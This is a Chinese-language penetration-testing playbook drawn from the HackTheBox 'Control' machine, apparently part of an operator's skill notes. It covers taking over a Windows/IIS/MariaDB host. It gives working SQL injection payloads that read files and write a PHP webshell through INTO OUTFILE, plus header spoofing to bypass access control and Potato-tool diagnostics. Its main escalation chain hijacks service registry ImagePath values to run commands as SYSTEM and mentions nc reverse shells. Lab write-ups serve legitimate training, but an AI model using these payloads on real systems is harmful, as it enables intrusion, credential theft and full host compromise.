# Windows + IIS + MariaDB：SQLi 落 webshell 与「服务注册表 ACL」提权

> 沉淀自 HTB-Control（2026-10-13；Windows Server 2019 Standard 17763.805 + IIS 10.0 + PHP 7.3.7 + MariaDB 10.4.8）。适用于：**IIS/PHP 应用存在"能往磁盘写文件"的 SQL 注入**，且机器上另有一个低权账号可供落脚。
> 二手结论取自 0xdf 与 raw.pm 的 HTB-Control writeup（正文凡引用处标注「来源：外部 writeup」）；未标注者为本会话实测或官方文档。本会话的提权主线与 writeup 一致，**新增价值在细节判读与失败归因**（§4、§5.4、§6）。
> 边界：通用提权检查清单见 `privesc-linux-windows.md`；shell 稳定 / 传文件 / 反弹矩阵见 `field-ops-toolbox.md`；Apache/XAMPP 场景见 `windows-webapp-foothold-to-local-admin.md`；受限执行（AppLocker / 按程序拦出站 / 周期还原）见 `windows-hardened-execution.md`；应用侧身份伪造见 `selfmade-session-and-token-forging.md`。
> **仅限授权测试**：§2 的写文件、§5 的注册表劫持均属 SKILL.md Phase 4「可执行代码 / 可提权」授权项。

---

## 0. 两条主线与顺序

```
注入点（可写文件）→ LOAD_FILE / INTO OUTFILE → webshell（低权）
   ↓
① 凭据猎取：应用配置文件里的连库口令 → 同库里的「同名 Windows 账号」hash → 爆破 → WinRM 换身份
② 本机提权：服务注册表键 ACL 弱点 → ImagePath 劫持 → SYSTEM
```

**本次的顺序教训**：`whoami /priv` 看到 `SeImpersonatePrivilege` 后立刻上 Potato 家族，连试三种全失败（§4 归因），时间白花；真正的通路是**服务注册表 ACL**（§5），而它靠的是"先凭据、后提权"那条线上的账号换来的写权限。

> "先凭据猎取横向、再本机提权"这条通用作战顺序的完整表述见 `windows-webapp-foothold-to-local-admin.md` §0，本笔记只写 Windows + IIS 场景下的差异与补强。

> 一句话纪律：**特权表只说明"理论上能用哪一类"，能不能用取决于环境前提**（SMB/445、DCOM/OXID、COM 回连端口）。开工前先做 §4 的前置三查。

---

## 1. 注入点写文件：先解决"写到哪"

### 1.1 读能力校准（第一步，不能跳）

```sql
' UNION SELECT IFNULL(LOAD_FILE('C:/Windows/win.ini'),0x4e554c4c),2,3,4,5,6-- -
```

**为什么先读 `win.ini`**：它默认存在且默认人人可读（本次实测可读），用它把"FILE 权限 + 路径正确 + 服务账号可读"三件事一次校准。

**判据的坑**：`LOAD_FILE` 返回 `NULL` 有**三种**原因（无 FILE 权限 / 路径不存在 / 无读权限），直接拿目标文件去试会把三种原因混成一个 NULL。**先做无害校准，再读目标**——本次就是先拿 `C:/xampp/htdocs/index.php` 试出 NULL，无法判读，才回头补的校准。

| 现象 | 结论 |
|---|---|
| `win.ini` 有内容 | FILE 权限在，读取链路通，可以继续定位路径 |
| `win.ini` 也是 NULL | 先怀疑没有 FILE 权限（`SHOW GRANTS` 看），别再猜路径 |

### 1.2 `secure_file_priv`：MariaDB 与 MySQL 语义**相反**

```sql
' UNION SELECT IFNULL(@@secure_file_priv,0x4e554c4c),2,3,4,5,6-- -
```

MariaDB 官方文档原文：*"If not set, the default, or set to empty string, the statements will work with any files that can be accessed."*（<https://mariadb.com/docs/server/server-management/variables-and-modes/server-system-variables#secure_file_priv>）

| DBMS | `NULL`（未设置） | 空字符串 | 具体目录 |
|---|---|---|---|
| **MariaDB**（本例） | **不限制路径** | 不限制路径 | 只能写该目录 |
| MySQL | **禁用文件导入导出** | 不限制路径 | 只能写该目录 |

MySQL 这一行不是转述文档，而是直接读官方源码核对的：`sql/mysqld.cc` 的 `is_secure_file_path()` 里，空串直接 `return true`（注释原文 *"All paths are secure if opt_secure_file_priv is 0"*），而值等于字面量 `"NULL"` 时 `return false`（全部拒绝）。来源：<https://github.com/mysql/mysql-server/blob/8.0/sql/mysqld.cc>（2026-10-13 核对）。

**踩坑提醒**：把 MySQL 的直觉套到 MariaDB 上，会把"可以任意写"误判成"写不了"。判据是**读出来的原始值 + 官方文档**，不是记忆。

### 1.3 `IFNULL(值, 0x4e554c4c)`：给 NULL 一个看得见的替身

`0x4e554c4c` 是十六进制字符串字面量，即 `NULL` 四个字母（`4E/55/4C/4C`）。

- **为什么要替身**：回显落在页面表格里，值是 NULL 时那一格是**空白**——和"空字符串""没渲染"无法区分。
- **为什么用十六进制**：单引号正是注入里的定界符，再塞 `'NULL'` 要额外转义；十六进制完全绕开引号。同法本次还用过 `0x7c`（`|`）、`0x3a`（`:`）作分隔符。

### 1.4 webroot 定位顺序（按"证据确定性"排）

| 顺序 | 目标 | 本次结果 |
|---|---|---|
| ① | `C:/Windows/System32/inetsrv/config/applicationHost.config`（权威物理路径） | **NULL**（该文件 ACL 只给管理员/SYSTEM，低权服务账号读不到） |
| ② | `C:/inetpub/history/CFGHISTORY_*/applicationHost.config`（IIS 配置历史备份；"ACL 比现役配置宽松"是**待验证**的经验说法，本次未命中） | 本次未命中（NO），但成本极低，值得先试 |
| ③ | `php.ini` 常见位置（`C:/Program Files/PHP/v7.3/php.ini` 等） → `doc_root`/`open_basedir`/`extension_dir` | **命中**（顺带确认 PHP 是独立安装，不是 XAMPP） |
| ④ | 由已知布局反推默认站点根：`C:/inetpub/wwwroot/index.php` | **命中** → webroot 确定 |
| ⑤ | 拿不到任何线索时的兜底 | 用一次请求批量测多个候选根目录（见下） |

**批量候选探测的写法**（把"多个候选"塞进一次请求，而不是逐个试）：

```sql
' UNION SELECT CONCAT('base=',IFNULL(@@basedir,0x4e554c4c),
  '|php=',IF(LOAD_FILE('C:/Program Files/PHP/v7.3/php.ini') IS NULL,'NO','YES'),
  '|hist=',IF(LOAD_FILE('C:/inetpub/history/CFGHISTORY_0000000001/applicationHost.config') IS NULL,'NO','YES'),
  '|www=',IF(LOAD_FILE('C:/inetpub/wwwroot/index.php') IS NULL,'NO','YES')),2,3,4,5,6-- -
```

只回 `YES/NO`，不把几十 KB 的配置灌进表格；`@@basedir`/`@@datadir` 同时给出 DB 的安装布局。

### 1.5 `INTO OUTFILE` 载荷构造（四件事都要想到）

```sql
zzz' UNION SELECT '<?php system($_REQUEST["c"]);?>','','','','','' INTO OUTFILE 'C:/inetpub/wwwroot/x.php'-- -
```

| 设计点 | 原因 |
|---|---|
| 列数 = 目标 UNION 的列数（本次 6） | 先用 `UNION SELECT 1..n` 数出列数；列数不对会报列不匹配 |
| 前缀用 `zzz'` 而不是 `'` | 让原查询 `LIKE '%zzz'` **匹配零行**，文件里只有我们这一行。用 `'` 时 `LIKE '%'` 会匹配全部商品（本次实测页面确实列出了全部行），那些行会一起写进文件 |
| 后 5 列填空串 | `INTO OUTFILE` 以制表符分隔字段，空串只留下 `\t`，对 PHP 无害 |
| PHP 里用双引号 `$_REQUEST["c"]` | 避免与 SQL 的单引号冲突；`$_GET[c]` 在 PHP 7.3 会报未定义常量告警 |

**写完先确认执行点**：访问 `http://<目标>/x.php?c=whoami`，本次回 `nt authority\iusr` —— 这就是后续所有枚举与提权动作的落脚身份。webshell 稳定化、反弹、传文件矩阵见 `field-ops-toolbox.md`。

**旁证**：写出来的 `x.php` 大小 37 字节，比 PHP 代码本身多出的正是尾部制表符与换行——可用它反证"文件确实被写入且没被截断"。

### 1.6 假错误：`SQLSTATE[HY000]: General error` 不代表写失败

**本次实测**：`INTO OUTFILE` 那条执行后页面显示 `Error: SQLSTATE[HY000]: General error`，但**文件已经写成功**。

**原因（推断，未做进一步验证）**：应用源码里是 `$rows = $stmt->fetchAll(...)`，而 `UNION SELECT … INTO OUTFILE` **不返回结果集**——"在无结果集的语句上调 `fetchAll()` 会抛通用错误"与本次现象吻合（源码是本次用 `LOAD_FILE` 读回应用自身 PHP 文件看到的）。机制细节不影响结论，**判据不变**。

**纪律**：写文件类载荷的判据是**目标 URL 能不能访问 / 文件内容对不对**，不是页面报不报错。

---

## 2. 请求头型访问控制：别只靠猜头名

现象：`admin.php` 返回 89 字节的 `Access Denied: Header Missing. Please ensure you go through the proxy…`。

**正确的探测顺序**：

1. **先在站点自己的源码/注释里找线索**。本例 `index.php` 注释写着 `- Enable SSL (Certificates location \\192.168.4.28\myfiles)`，内网地址直接给出了要伪造的值。
2. **头名与取值合成一个矩阵一次跑完**（本次 16 个头名 × 11 个候选 IP），只比对**响应长度**，长度变了的那个就是命中：只有 `X-Forwarded-For: 192.168.4.28` 返回 7933 字节的完整后台页。
3. **浏览器侧持久化**：Burp `Match and Replace` 加一条 `Request header` 规则（`Match` 留空 = 追加新头，`Replace` 填 `X-Forwarded-For: <值>`），之后表单提交也会自动带上。
   - 官方依据：<https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace/creating>

**两个观察**（未深究，供后续留意）：

- 拒绝文案出现过两种：`…go through the proxy…`（89 字节）与 `…go through to proxy…`（88 字节）。同一站点两个守卫脚本/两处校验各写各的很常见，判读时别把"文案不同"当成"机制不同"。
- 该头**只对部分文件生效**：本次写入的 `x.php` 不带该头也能正常访问。别默认"全站都要带头"。

---

## 3. 低权落脚点：`NT AUTHORITY\IUSR` 的画像

| 项目 | 本次实测 |
|---|---|
| 特权 | `SeChangeNotifyPrivilege`、**`SeImpersonatePrivilege`**、`SeCreateGlobalPrivilege` |
| 能读 | 站点目录（`C:\inetpub\wwwroot\*` 可读回源码与配置）、`C:\Windows\win.ini` 这类人人可读文件 |
| 不能读 | `applicationHost.config`、其他用户 profile（`C:\Users\Hector\…`）、web 目录下**由 SYSTEM 创建**的文件（实测 `type` 报 `Access is denied`） |
| 能写 | 本例 `C:\` 根目录居然可建目录写文件（`C:\Apps`），这是非默认的宽松配置，通常是出题人留的落点 |

**落盘回读的两个坑**：

1. **写文件的人决定 ACL**：SYSTEM 落在 `C:\inetpub\wwwroot\uploads\` 的结果文件，低权用户可能读不到；**优先落到自己（低权身份）建的可写目录**，或直接走 HTTP 读回。
2. **`Get-Service`（无参）在某些上下文返回空**（本次在 IIS/`IUSR` 与 WinRM 会话里都是 `count=0`，而 `Get-Service <名字>` 正常）——**枚举服务要用命名查询或 `sc query`，别用无参列表**，否则会误判"没有可用的服务"。

---

## 4. Potato 家族的环境归因（本笔记最值钱的一节）

**结论先行**：`SeImpersonate` 只是入场券；三类 Potato 各有**独立的环境前提**，缺一条就必然失败。

| 工具 | 机制 | 硬前提 | 本次实测结果与归因 |
|---|---|---|---|
| **PrintSpoofer** | 骗 Print Spooler 连回 `\\<本机>\pipe\<随机名>`，拿到 SYSTEM 令牌 | spooler 在跑 **且** 本机 SMB 服务在听（远程命名管道走 SMB） | spooler 状态 `Running`，却 `[+] Named pipe listening...` 后 `[-] Operation failed or timed out.`；`netstat` 里 **445 没有 LISTENING** → 回连链路根本不存在（**归因推断，高置信**） |
| **GodPotato** | 挂钩 RPCSS 的 DCOM OXID 解析，由 RPCSS 以 SYSTEM 回连本地管道 | 本地 OXID 挂钩对该 build 有效 | `UnmarshalObject: 0x80070776` 后 `[!] Failed to impersonate security context token`；`0x80070776` = `HRESULT_FROM_WIN32(1910)`，**1910 = `OR_INVALID_OXID`**（mingw-w64 `winerror.h`：`#define OR_INVALID_OXID 1910`）→ 挂钩没生效，拿不到令牌（**不是权限问题**） |
| **JuicyPotatoNG** | 同上思路的另一种实现，需要特权进程回连它起的 COM 服务器端口 | 该端口可被特权进程访问 | 默认端口：`[-] The privileged process failed to communicate with our COM Server`；加 `-s`（自动找未被防火墙拦的端口）**直接卡死无输出** |

**开工前的三查**（把"能不能用 Potato"变成可判读的事）：

```cmd
netstat -ano | findstr LISTENING     :: 445 在不在（PrintSpoofer 的命门）
Get-Service Spooler | Select-Object Name,Status
whoami /priv                          :: 有没有 SeImpersonate
```

- **445 不在听** ⇒ 所有"诱导服务通过 UNC/远程管道回连"的手法（PrintSpoofer、EfsPotato 的 UNC 变体）可以直接放弃。这是**机制推断**（远程命名管道走 SMB），与本机 PrintSpoofer 超时的现象吻合；若 445 在听而仍超时，则要回到 spooler 的 RPC/策略层面另找原因。
- 走 DCOM/RPC 路线（GodPotato / JuicyPotatoNG / RoguePotato）时，**本地挂钩失败就换"攻击机侧解析"的 RoguePotato**（需要 Kali 上 `socat tcp-listen:135,…`，**135 是特权端口，非 root 起不来**，桥接环境下这就是一条硬墙）。
- **失败要归因，不要重跑**：`0x80070776`、`1053`、`failed to communicate` 各自指向不同的缺失前提。

---

## 5. 服务注册表 ACL → ImagePath 劫持（提权主线）

### 5.1 弱点判据（两条，都要成立）

```powershell
# 判据一：服务键能不能被我改
get-acl HKLM:\SYSTEM\CurrentControlSet\Services | fl
# 本次输出里赫然有：CONTROL\Hector   Allow  FullControl
```

```cmd
:: 判据二：服务本身能不能被我启动（SDDL 里的 SW = SERVICE_START，主体要看是不是 AU/Users/我）
sc sdshow wuauserv
```

> 技术归类：MITRE ATT&CK **T1574.011 Hijack Execution Flow: Services Registry Permissions Weakness**。

**注意别和"服务对象 DACL"混为一谈**：本节的判据一是**注册表键**能不能改（普通用户也可能因 ACL 继承拿到 FullControl），判据二是**服务对象**能不能启动。多数服务的 DACL 默认不给普通用户启停（`windows-webapp-foothold-to-local-admin.md` §3.4 记录了 `IU` 只有读权限的反例），但**也存在 `AU` 被授 `SERVICE_START` 的服务**（本例 `wuauserv`）——**必须逐服务用 `sc sdshow` 判读，不能按"默认不行"一刀切**。

**不要只看工具的结论**：外部 writeup 记录 winPEAS 在同一台机器上报"不能修改服务"，实际 `Hector` 对服务键有 FullControl。**权限问题的唯一判据是 ACL 本身**（`get-acl` / `sc sdshow`），工具输出只当线索。

### 5.2 分工：写键的身份 ≠ 启服务的身份

| 动作 | 需要的权限 | 本次身份 |
|---|---|---|
| 改 `ImagePath` | 服务**注册表键**的写权限 | `CONTROL\Hector`（低权用户，但对服务键有 FullControl） |
| `sc start <服务>` | 服务对象的 `SERVICE_START` | `NT AUTHORITY\IUSR`（低权，但 AU 组允许启动） |

**判读**：两个动作可以分给两个不同身份完成——**只要各自那一项权限到位**。本例中 `IUSR` 改不了注册表键（实测 `reg add` 回 `ERROR: Access is denied.`），而它**能**启服务；反过来 `Hector` 能写键。

### 5.3 选靶子：三条硬条件

1. 服务当前是 **Stopped**（`Get-Service <名>` / `sc query <名>`）——对正在跑的服务 `sc start` 是空操作，改了 `ImagePath` 也不会执行；
2. 不是 **Disabled**（否则 `sc start` 回 **1058**：*the service cannot be started…disabled*）；
3. 不是 **签名保护服务**（否则 `sc start` 回 **577**：*Windows cannot verify the digital signature for this file*，本次 `WaaSMedicSvc` 即此类）。

批量筛法（一行，按需扩表）：

```powershell
foreach ($s in 'BITS','WerSvc','SensorService','MapsBroker','WaaSMedicSvc') {
  $q = ((cmd /c ("sc query " + $s)) -join ' '); $c = ((cmd /c ("sc qc " + $s)) -join ' ')
  if ($q -match 'STOPPED' -and $c -notmatch 'DISABLED') { $s + ' CANDIDATE' } else { $s + ' skip' }
}
```

### 5.4 载荷形态：先试"落盘回读"，再谈反向 shell

**推荐的第一次尝试**（不依赖回连，判据硬）：

```powershell
$payload = 'cmd /c type C:\Users\Hector\Desktop\user.txt > C:\Apps\f.txt 2>&1 & type C:\Users\Administrator\Desktop\root.txt >> C:\Apps\f.txt'
$reg = 'reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v ImagePath /t REG_EXPAND_SZ /d "' + $payload + '" /f'
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { param($x) cmd /c $x } -ArgumentList $reg   # 以"能写键"的身份执行
cmd /c 'sc start wuauserv'                                                                                          # 以"能启服务"的身份触发
type C:\Apps\f.txt
```

**本次实测的两个关键判读**：

- `sc start` 回 **1053**（*did not respond to the start or control request in a timely fashion*）**不代表失败**——我们的命令本来就不是服务程序，跑完即退；**它能写文件就说明已经以 SYSTEM 执行过**（两个 flag 正是这样拿到的）。**永远看副作用，不看返回码。**
- **本环境下服务上下文只跑得起 cmd 内建命令**：

  | ImagePath payload | 结果 |
  |---|---|
  | `cmd /c echo HELLO_BUILTIN > …\s7.txt` | **16 字节，有内容** ✅（cmd 内建） |
  | `cmd /c C:\Windows\System32\whoami.exe > …\s8.txt` | **0 字节** ❌（外部程序） |
  | `cmd.exe /c whoami.exe /all > …\s9.txt` | **0 字节** ❌ |
  | 直接以 `nc64.exe -e cmd.exe …` / `powershell -enc …` 作 ImagePath | 无回连 ❌ |

  ⇒ **判据**：`echo` 有内容、`whoami.exe` 没有，说明"进程能起来但拉不起外部子进程"。**这类环境下别指望靠服务起 nc/PowerShell 反弹**，改用 §5.4 的落盘回读。机制未验证（可能是 job object 或 session 0 控制台限制），**换环境必须重新做一次这条对照实验**。

### 5.5 收尾：写回原值

```powershell
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { cmd /c 'reg add "HKLM\SYSTEM\CurrentControlSet\Services\<服务>" /v ImagePath /t REG_EXPAND_SZ /d "<原值>" /f' }
```

本次改过的四个服务及其原值（示例，恢复时以自己 `reg query` 读到的为准）：

| 服务 | 原 ImagePath |
|---|---|
| `wuauserv` | `%systemroot%\system32\svchost.exe -k netsvcs -p` |
| `WaaSMedicSvc` | `%systemroot%\system32\svchost.exe -k wusvcs -p` |
| `MapsBroker` | `%SystemRoot%\System32\svchost.exe -k NetworkService -p` |
| `SensorService` | `%SystemRoot%\system32\svchost.exe -k LocalSystemNetworkRestricted -p` |

**纪律**：动手前先 `reg query` 存原值，**一次改一个变量**（先 Stopped 判定、再写入、再回读确认、最后触发），失败先复原再换下一个靶子。

### 5.6 本机横向：WinRM loopback 换身份（提权的"写权限"从哪来）

```powershell
$p = ConvertTo-SecureString '<明文>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('CONTROL\hector',$p)     # ← 必须带机器名前缀
Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock { whoami }
```

| 现象 | 含义 |
|---|---|
| `control\hector` | 成功：拿到目标账号身份（本次用它去改服务注册表键） |
| `0x8009030d … A specified logon session does not exist` | **用户名没带机器名前缀**（写成 `hector` 而非 `CONTROL\hector`）。该报错同时对应"口令无效"和"上下文不支持"，**别据此断言口令错** |
| 目标账号须在 `Remote Management Users`（或管理员） | 用 `net user <账号>` 的"本地组成员资格"确认 |

**机器名怎么取**：本会话里同一台机器在不同上下文出现过两个名字——`hostname` 在 webshell（`IUSR`）里回 `Fidelity`，而以 `CONTROL\hector` 前缀做 WinRM 认证却成功、`whoami` 回 `control\hector`。**以"能通过认证的那个前缀"为准**；拿不准就先 `hostname` + `whoami` 各跑一次交叉确认，别照抄 `mysql.user` 里的 host 列（本例那里写着 `fidelity`，与实际认证前缀不一致）。

**为什么走 loopback 而不是从 Kali 连**：本例外部 `5985/445/3389` 全部 `filtered`（防火墙只放行 80 等），但**靶机自己连自己的 5985 是通的**——"外部打不通"不等于"这条横向路不存在"。

**同一台机器上另外两条换身份的路，以及它们的坑**：

| 路径 | 前提 | 本次结果 |
|---|---|---|
| `Start-Process -Credential` | **`seclogon`（Secondary Logon）服务在跑** | 服务 `Stopped` → 报 `The handle is invalid`（**与口令对不对无关**） |
| `LogonUser` + `WindowsIdentity::Impersonate` | `SeImpersonate` | 可用，但**模拟只作用于当前线程**：`reg add` 这类**子进程用的是进程主令牌**，仍然以低权身份跑；要改注册表必须用**进程内**接口（PowerShell 的 `Set-ItemProperty 'HKLM:\…'`） |

---

## 6. 判读纪律（本次新增/强化）

| 纪律 | 反例（本次踩到的） |
|---|---|
| **`NULL` 是复合信号，先校准再判读** | 直接读目标文件得到 NULL，无法区分"无权限/路径错/不可读" |
| **页面报错 ≠ 动作失败** | `SQLSTATE[HY000]: General error` 时文件其实已写入 |
| **返回码 ≠ 结果** | `sc start` 回 1053，两个 flag 却已经写在磁盘上 |
| **特权表 ≠ 打法可用** | 有 `SeImpersonate`，三种 Potato 全因环境前提缺失而失败 |
| **ACL 才是权限的唯一判据** | winPEAS 报"不能改服务"，实际有 FullControl |
| **低权身份"直接敲"的命令是以低权身份跑的** | 把 SYSTEM 用的 payload 直接在 `iusr` shell 里执行，只会得到空文件（读不到别人的桌面）；**payload 必须由服务触发** |
| **落盘回读要选对位置** | SYSTEM 写在 web 目录的文件低权用户读不到（`Access is denied`），改落自建可写目录或走 HTTP |
| **枚举服务别用无参 `Get-Service`** | 在 IIS/WinRM 上下文里返回空，会误判"没有可用服务" |
| **改动前存原值、改动后恢复** | 服务 `ImagePath`、注册表键都属"改了就影响靶机"的状态 |

---

## 7. 报告与证据要点

1. **入口**：伪造头名 + 取值 + 来源（写成"值来自 index.php 注释里的内网地址"，比"爆破得到"更有说服力）。
2. **注入**：确认载荷、列数、回显位；写文件那一步附**文件 URL 可访问**的证据。
3. **落地点**：`whoami` 回显、`whoami /priv` 原样输出。
4. **凭据**：hash 来源表（`mysql.user`）、hashcat 模式与命中的明文；**注意 hash 文件格式**——本次首次跑 `-m 300` 因 hash 文件里混入多余字符报 `Token length exception`，**先用一个已知明文的 hash 做对照自检**（例如应用配置里读到的那个账号），再跑目标 hash。
5. **提权**：`get-acl` 的原始输出（含 `FullControl` 那行）＋ `reg query` 的原值 ＋ 触发后的副作用证据（文件内容）＋ **复原记录**。
6. **收尾**：列出所有被改过的服务/键，并给出复原命令与复原后的回读结果；清理临时文件（webshell、落盘结果、`C:\Apps` 下的工具）。

> **凭据脱敏**：口令 / hash / flag 一律以占位符形式记录（本 note 即如此：正文只出现 `<明文>` 占位，不含任何真实凭据），与 `windows-hardened-execution.md` 同规。
